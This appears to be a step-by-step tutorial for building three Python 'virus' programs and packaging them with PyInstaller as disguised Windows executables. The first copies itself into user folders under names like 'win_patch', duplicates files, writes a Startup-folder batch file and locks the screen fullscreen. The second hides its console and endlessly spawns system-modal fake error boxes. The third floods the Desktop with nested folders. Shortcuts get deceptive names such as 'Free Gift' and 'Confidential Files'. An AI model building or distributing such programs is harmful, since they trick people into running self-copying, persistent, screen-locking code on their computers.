## MALWARE

### Step 2: Setup your Virtual Environment

To activate:
```bash 
python -m venv venv
```

```bash
venv\Scripts\activate
```
 ### Step 3: Install Required Libraries

```bash
pip install pygame
```

### Step 4: infecto.py

```bash
import os, shutil, random, time, datetime, tkinter as tk, pygame
from threading import Thread

# ===== CONFIG =====
TARGET_DIRS = [
    os.path.expanduser("~/Desktop"),
    os.path.expanduser("~/Documents"),
    "C:\\Temp"
]
FAKE_EXT = ".infected"
ALARM_FILE = os.path.join(os.path.dirname(__file__), "alert.wav")
SIM_DURATION = 20
SAVE_DIR = os.path.expanduser("~/Desktop")  # infection_log.txt will be saved here
# ==================

log = []

def log_event(event, box=None):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {event}"
    log.append(entry)
    print(entry)
    if box:
        box.insert(tk.END, entry + "\n")
        box.see(tk.END)

def save_log():
    """Save IOC log to Desktop after infection ends"""
    try:
        fname = os.path.join(SAVE_DIR, "infection_log.txt")
        with open(fname, "w") as f:
            for entry in log:
                f.write(entry + "\n")
        print(f"[+] Infection log saved at: {fname}")
    except Exception as e:
        print(f"[!] Could not save log: {e}")

def spread_self(log_box=None):
    exe_path = os.path.abspath(__file__)
    for d in TARGET_DIRS:
        try:
            os.makedirs(d, exist_ok=True)
            target = os.path.join(d, f"win_patch_{random.randint(1000,9999)}.py")
            shutil.copy(exe_path, target)
            log_event(f"Copied to {target}", log_box)
        except Exception as e:
            log_event(f"Spread failed: {e}", log_box)

def infect_files(log_box=None):
    for d in TARGET_DIRS:
        try:
            for fname in os.listdir(d):
                fpath = os.path.join(d, fname)
                if os.path.isfile(fpath) and not fpath.endswith(FAKE_EXT):
                    infected = fpath + FAKE_EXT
                    shutil.copy(fpath, infected)
                    log_event(f"File infected: {infected}", log_box)
        except:
            pass

def simulate_persistence(log_box=None):
    try:
        startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
        os.makedirs(startup, exist_ok=True)
        dummy = os.path.join(startup, "startup_infect.bat")
        with open(dummy, "w") as f:
            f.write("echo Fake persistence simulation - no real damage.")
        log_event(f"Persistence simulated at: {dummy}", log_box)
    except Exception as e:
        log_event(f"Persistence failed: {e}", log_box)

def play_alert():
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(ALARM_FILE)
        pygame.mixer.music.play(-1)
        print(f"[+] Playing sound from {ALARM_FILE}")
    except Exception as e:
        log_event(f"Alert sound error: {e}")

# --- Fullscreen infection GUI ---
def infection_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.wm_attributes("-topmost", 1)

    # disable exit + keyboard
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind_all("<Key>", lambda e: "break")
    root.bind_all("<Alt-Key>", lambda e: "break")

    warning = tk.Label(
        root,
        text="⚠️ YOUR PC HAS BEEN INFECTED ⚠️",
        fg="red",
        bg="black",
        font=("Consolas", 42, "bold")
    )
    warning.place(relx=0.5, rely=0.3, anchor="center")

    submsg = tk.Label(
        root,
        text="Do not turn off your computer.\nFiles are being corrupted...",
        fg="yellow",
        bg="black",
        font=("Consolas", 20)
    )
    submsg.place(relx=0.5, rely=0.42, anchor="center")

    log_box = tk.Text(root, height=15, width=95, bg="black", fg="lime", font=("Consolas", 12))
    log_box.place(relx=0.5, rely=0.75, anchor="center")

    # Animation vars
    direction = 1
    y_pos = 0.3
    start_time = time.time()

    while time.time() - start_time < SIM_DURATION:
        # Move the red warning up and down
        y_pos += 0.003 * direction
        if y_pos > 0.35 or y_pos < 0.25:
            direction *= -1
        warning.place(relx=0.5, rely=y_pos, anchor="center")

        # Fake infection events
        if random.random() < 0.25:
            fake_event = random.choice([
                "Injected into explorer.exe",
                "Modified registry key HKCU\\Run",
                "Spawned process: svchost32.exe",
                "Spreading to Documents folder",
                "Memory hook installed"
            ])
            log_event(fake_event, log_box)

        root.update()
        time.sleep(0.2)

    root.destroy()
    save_log()  

# --- MAIN ---
def main():
    Thread(target=spread_self, daemon=True).start()
    Thread(target=infect_files, daemon=True).start()
    Thread(target=simulate_persistence, daemon=True).start()
    Thread(target=play_alert, daemon=True).start()
    infection_screen()

if __name__ == "__main__":
    main()

```

## Creating a EXE FILE
#### 1. Convert Script to EXE

Prepare the Icon

#### Go to: https://www.iconarchive.com/
##### Download and Rename the file (example: infecto.ico).
##### Move it to the same folder as your infecto.py.
##### Take note: whatever you name the .ico file is what you must also put in the PyInstaller command.

Paste this: 
```bash
pip install pyinstaller
```
```bash
pyinstaller --onefile --windowed --icon=infecto.ico infecto.py
```
#### 2. Create the Desktop Shortcut
- Right-click Desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\LAB\InfectoV\dist\infecto.exe
- Right-click the shortcut → Properties → Change Icon
- Select your infecto.ico.

# Virus 2

### Step 1: Inside the malware folder add a new folder (vs code) name it virus2

### Step 2: Setup your Virtual Environment
Open vs code and in the terminal move out of directory:
```bash
cd ..
```
```bash
cd virus2
````
Install Required Library
```bash
pip install pywin32
```

### Step 3: Fake_error.py
```bash
import random
import time
import win32gui
import win32con
import ctypes
import sys
from threading import Thread

# ===== CONFIG =====
MAX_SPEED = True          # Set to False for less aggressive spamming
HIDE_CONSOLE = True      # Run completely in background
# ==================


ERROR_MESSAGES = [
    "CRITICAL SYSTEM FAILURE: Hoy, magbayad ka na ng utang mo!",
    "VIRUS ALERT: May balance ka pa sa utang mo!",
    "BSOD IMMINENT: 0x0000007B Mabagal ang iyong PC",
    "ERROR: Kulang ka sa tulog at pagmamahal.",
    "WARNING: Nag-ooverheat na CPU mo.",
    "ALERT: Puno na ang memory, i-delete mo na mga screenshot ng ex mo!",
    "SYSTEM32 DELETION IN PROGRESS: 37% complete",
    "CRITICAL: Kailangan ko ng pera, pera, pera",
    "ERROR: May virus na galing sa pag-download ng 'FreeIphone.exe'!",
    "404: Utang na loob, bayaran mo na!",
    "ALERT:  Naubos ang RAM kasi bukas lahat ng tabs ng Chrome!",
    "FATAL ERROR: Storage full, i-delete mo na yung 100 selfies sa jeep!",
]

def show_error():
    """Shows a fake error message"""
    title = random.choice([
        "Microsoft Windows",
        "System Alert",
        "CRITICAL ERROR",
        "Virus Protection",
        "IT Department"
    ])
    
    style = random.choice([
        win32con.MB_ICONERROR | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONWARNING | win32con.MB_SYSTEMMODAL,
        win32con.MB_ICONINFORMATION | win32con.MB_SYSTEMMODAL
    ])
    
    win32gui.MessageBox(
        0,
        random.choice(ERROR_MESSAGES),
        title,
        style
    )

def hide_console():
    """Completely hides the console window"""
    ctypes.windll.user32.ShowWindow(
        ctypes.windll.kernel32.GetConsoleWindow(),
        0
    )

def main():
    if HIDE_CONSOLE:
        hide_console()
    
    # Calculate delay based on intensity
    delay = 0.1 if MAX_SPEED else random.uniform(0.5, 1.5)
    
    # Main spamming loop
    while True:
        try:
            # Spawn multiple error threads for maximum chaos
            for _ in range(random.randint(1, 3 if MAX_SPEED else 1)):
                Thread(target=show_error).start()
            
            time.sleep(delay)
        except:
            pass

if __name__ == "__main__":
    # Make sure only one instance runs
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "FakeErrorMutex")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit()
        
        main()
    finally:
        if 'mutex' in locals():
            ctypes.windll.kernel32.CloseHandle(mutex)
```

Run it:
```bash
python fake_error.py
```

Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: winrar
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into winrar
- Move the winrar.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=error.ico fake_error.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus3\dist\fake_error.exe
- Name it "Confidential Files"

# Virus 3 Infinite Folder

### Step 1: Inside the malware folder add a new folder (vs code) name it virus3

### Step 2: Setup your Virtual Environment
Open vs code and in the terminal move out of directory:
```bash
cd ..
```
```bash
cd virus3
````
Install Required Library
```bash
pip install pywin32
```

### Step 3: infinitefolder_prank.py.

```bash
import os
import time
import shutil
from threading import Thread

# ===== CONFIG =====
FOLDER_NAME = "FOLDER_INVASION"    # Name of the main folder
DELAY_SECONDS = 0.3                # Speed of appearance (0.3s is optimal)
TOTAL_FOLDERS = 50                 # Total folders to create (stops automatically)
# ==================

def get_desktop_path():
    """Get the correct Desktop path (works with OneDrive too)"""
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if not os.path.exists(desktop):
        desktop = os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop")
    return desktop

def create_visible_folders():
    """Creates folders that visibly appear on Desktop"""
    desktop = get_desktop_path()
    root_path = os.path.join(desktop, FOLDER_NAME)
    
    # Clear previous run if exists
    if os.path.exists(root_path):
        shutil.rmtree(root_path)
    
    # Create initial folder
    os.makedirs(root_path)
    
    # Create nested folders
    current_path = root_path
    for i in range(1, TOTAL_FOLDERS + 1):
        current_path = os.path.join(current_path, f"FOLDER_{i}")
        os.makedirs(current_path)
        
        # Force folder refresh on Windows
        if os.name == 'nt':
            os.system(f'explorer /select,"{current_path}"')
        
        print(f"Created: {current_path}")  # Console log
        time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print("\n=== VISIBLE FOLDER PRANK ===")
    print(f"Creating {TOTAL_FOLDERS} folders on Desktop...\n")
    print("Watch them appear in real-time!")
    print("Press CTRL+C to stop early\n")
    
    try:
        create_visible_folders()
    except KeyboardInterrupt:
        print("\nStopped by user!")
    finally:
        print(f"\nDone! Check your Desktop for '{FOLDER_NAME}'")
        print("To delete: Right-click the folder and select 'Delete'")
```

Run it:
```bash
python infinitefolder_prank.py
```
Creating a Clickable Desktop Icon
#### #1 Convert Script to EXE

- Navigate to this link: https://www.iconarchive.com/
- Search your desired icon. For example: gift
- Click All Downloads Format
- Choose Windows: Download ICO
- Rename the file into gift
- Move the gift.ico to your folder

In your terminal, paste this:
```bash
pip install pyinstaller
pyinstaller --onefile --windowed --icon=gift.ico infinitefolder_prank.py
```
#### #2 Create the Desktop Shortcut
- Right-click desktop → New → Shortcut
- Browse to: C:\Users\Administrator\Downloads\malware\virus2\dist\infinitefolder_prank.exe
- Name it "Free Gift"

